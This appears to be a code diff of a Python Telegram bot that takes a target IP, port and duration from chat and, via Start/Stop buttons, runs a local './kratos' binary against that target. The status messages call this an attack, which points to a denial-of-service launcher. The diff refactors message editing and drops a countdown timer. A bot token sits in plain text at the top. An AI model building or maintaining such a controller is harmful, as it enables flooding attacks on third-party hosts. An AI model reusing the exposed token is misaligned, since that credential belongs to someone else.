@@ -9,24 +9,32 @@ bot_token = "7483201528:AAElIxI0_iaD1lxxHwcXtPBYDqZHQkaKlpE"
 
 client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)
 
-# Store running processes
+# Store running processes and messages
 running_processes = {}
-message_cache = {}
+message_ids = {}
 
 @client.on(events.NewMessage(pattern=r"^(\d+\.\d+\.\d+\.\d+)\s(\d+)\s(\d+)$"))
 async def handle_ip_port(event):
     ip, port, duration = event.pattern_match.groups()
-    await event.respond(
+
+    # Send the initial message with the start/stop buttons
+    message = await event.respond(
         f"Received IP: {ip}, Port: {port}, Duration: {duration}\nChoose an action:",
         buttons=[
             [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}")]
         ]
     )
 
+    # Save the message ID for later editing
+    message_ids[(event.chat_id, ip, port)] = message.id
+
 @client.on(events.CallbackQuery(pattern=b"(start|stop)\|(\d+\.\d+\.\d+\.\d+)\|(\d+)(?:\|(\d+))?"))
 async def handle_buttons(event):
     action, ip, port, duration = event.pattern_match.groups()
     chat_id = event.chat_id
+
+    # Get the original message ID to edit later
+    message_id = message_ids.get((chat_id, ip.decode(), port.decode()), None)
 
     if action == b"start":
         if (chat_id, ip, port) in running_processes:
@@ -35,107 +43,49 @@ async def handle_buttons(event):
 
         duration = int(duration.decode()) if duration else 60
         await event.answer("Starting the attack...", alert=True)
-        
-        # Update message with attack starting status and countdown
-        message = await event.edit(
-            f"IP: {ip.decode()}:{port.decode()}\nStatus: Attack ongoing\nTime: {duration}s",
-            buttons=[
-                [Button.inline("Start", data=f"start|{ip.decode()}|{port.decode()}|{duration}"), Button.inline("Stop", data=f"stop|{ip.decode()}|{port.decode()}")]
-            ]
-        )
-        message_cache[(chat_id, ip, port)] = message
-        
-        process = await run_attack(chat_id, ip.decode(), port.decode(), duration, message)
+        process = await run_attack(chat_id, ip.decode(), port.decode(), duration)
         running_processes[(chat_id, ip, port)] = process
+
+        # Update the message with attack status
+        if message_id:
+            await client.edit_message(chat_id, message_id, f"{ip.decode()}:{port.decode()}\nStatus: Attack ongoing")
 
     elif action == b"stop":
         process = running_processes.pop((chat_id, ip, port), None)
         if process:
             process.terminate()
             await event.answer("Attack stopped successfully!", alert=True)
-            
-            # Update message to show attack stopped and remove time
-            message = message_cache.get((chat_id, ip, port))
-            if message:
-                await message.edit(
-                    f"IP: {ip.decode()}:{port.decode()}\nStatus: Attack stopped",
-                    buttons=[
-                        [Button.inline("Start", data=f"start|{ip.decode()}|{port.decode()}|{duration}"), Button.inline("Stop", data=f"stop|{ip.decode()}|{port.decode()}")]
-                    ]
-                )
-                del message_cache[(chat_id, ip, port)]
-                
-            # Stop the countdown and make sure it doesn't reappear
-            running_processes[(chat_id, ip, port)] = None
+
+            # Update the message with attack status
+            if message_id:
+                await client.edit_message(chat_id, message_id, f"{ip.decode()}:{port.decode()}\nStatus: Attack stopped")
         else:
             await event.answer("No running attack to stop!", alert=True)
 
-async def run_attack(chat_id, ip, port, duration, message):
+async def run_attack(chat_id, ip, port, duration):
     try:
-        # Running the command and capturing its output
         process = await asyncio.create_subprocess_shell(
             f"./kratos {ip} {port} {duration} 750",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
 
-        # Monitor the process output in the background
-        asyncio.create_task(monitor_process(chat_id, process, message))
-        # Start countdown in background
-        asyncio.create_task(countdown_timer(chat_id, ip, port, duration, message))
-
+        # Monitor process in the background
+        asyncio.create_task(monitor_process(chat_id, process))
         return process
     except Exception as e:
         await client.send_message(chat_id, f"Failed to start attack: {e}")
         return None
 
-async def monitor_process(chat_id, process, message):
+async def monitor_process(chat_id, process):
     try:
         stdout, stderr = await process.communicate()
-        
         if stdout:
-            output = stdout.decode()
-            await message.edit(
-                f"Process Output:\n{output}",
-                buttons=[
-                    [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}")]
-                ]
-            )
-        
+            await client.send_message(chat_id, f"Process output: {stdout.decode()}")
         if stderr:
-            error = stderr.decode()
-            await message.edit(
-                f"Process Error:\n{error}",
-                buttons=[
-                    [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}")]
-                ]
-            )
+            await client.send_message(chat_id, f"Process error: {stderr.decode()}")
     except Exception as e:
         await client.send_message(chat_id, f"Error monitoring process: {e}")
-
-async def countdown_timer(chat_id, ip, port, duration, message):
-    remaining_time = duration
-    while remaining_time > 0:
-        if (chat_id, ip, port) not in running_processes or running_processes[(chat_id, ip, port)] is None:
-            return  # Stop the countdown if the attack has been stopped
-        await asyncio.sleep(1)
-        remaining_time -= 1
-        await message.edit(
-            f"IP: {ip}:{port}\nStatus: Attack ongoing\nTime: {remaining_time}s",
-            buttons=[
-                [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}")]
-            ]
-        )
-    
-    # After countdown reaches 0, stop attack and update status
-    if (chat_id, ip, port) in running_processes:
-        await message.edit(
-            f"IP: {ip}:{port}\nStatus: Attack stopped",
-            buttons=[
-                [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}")]
-            ]
-        )
-        del running_processes[(chat_id, ip, port)]
 
 if __name__ == "__main__":
     client.run_until_disconnected()
